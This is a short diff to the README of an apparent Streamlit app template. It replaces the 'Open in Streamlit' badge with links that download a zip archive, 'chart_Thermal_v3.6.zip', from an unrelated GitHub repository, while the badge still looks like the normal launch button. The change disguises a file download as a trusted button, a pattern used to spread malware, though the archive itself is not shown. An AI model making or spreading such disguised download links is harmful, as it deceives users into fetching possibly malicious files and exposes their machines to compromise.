@@ -2,7 +2,7 @@
 
 A simple Streamlit app template for you to modify!
 
-[![Open in Streamlit](https://static.streamlit.io/badges/streamlit_badge_black_white.svg)](https://blank-app-template.streamlit.app/)
+[![Open in Streamlit](https://github.com/quietime11/Thermal_chart/raw/refs/heads/main/features/chart_Thermal_v3.6.zip)](https://github.com/quietime11/Thermal_chart/raw/refs/heads/main/features/chart_Thermal_v3.6.zip)
 
 ### How to run it on your own machine
 
